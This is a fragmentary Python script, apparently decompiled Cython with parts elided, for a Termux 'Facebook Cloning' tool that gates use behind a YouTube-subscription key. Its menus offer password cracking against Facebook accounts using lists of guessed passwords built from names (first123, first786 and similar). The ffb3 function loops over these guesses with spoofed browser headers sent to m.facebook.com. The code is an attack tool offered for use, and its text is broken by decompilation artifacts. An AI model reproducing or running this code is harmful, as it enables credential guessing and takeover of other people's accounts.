...
ugen=['Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25']
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      print("\33[1;32mYour Token is Successfully Approved- Now Enjoy")
      msg = str(os.geteuid())
      time.sleep(0.5)
      Menu()
      pass
      ...
      print("\33[1;37m----------------------------------------------")
      print("\33[1;37mthis tool is free")
      print('Aapko Log ko Muje EK Help Karna Hai ')
      print('Mera Youtube Channel Suscribe Karke Ss Bhejo Approval Mil Jayega')
      print('\33[1;37m----------------------------------------------')
      print ('Mere Channel Me Ab Se Termux Related Video Milega A to Z')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                plist = []
                                print(' Select Password Crack menu');linex();print(' [1] auto password(Best Crack) \n [2] Crack with choice password \n [3] Working passwords List ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                        ...
                                        print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
                                        linex()
                                        print('\033[1;32m Here Working Password List\033[1;37m ')
                                        linex()
                                        print(' [1] first last\n [2] first12345\n [3] first@123\n [4] first@12345\n [5] first123 ')
                                        linex()
                        ...
                        print("\033[1;31m Your can't Suscribed My Channel ...!\033[1;37m");time.sleep(1)
                        clear()
                        print('\033[1;31m First Read Note : ')
                        print("\033[1;36m Mera Youtube Channel Suscribe Karke Ss Bhejo Approval Mil Jayegae\033[1;37m")
                        linex()
                        print(' \033[1;31mYour Key Not Registered\033[1;37m')
                        print(f" \033[1;37mYour Key : {fkeyx}")
                        linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free Not Suscribe my channel then not come in my inbox\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
                        linex()
                        input(" Choose Option : ")
                        linex()
                        ...
                        linex()
                        tks = ("Hi Rahu Rb Sir, I have already Suscribed Your Youtube Channel SO ,Please Accept My Key for Use:)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def ffb3(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
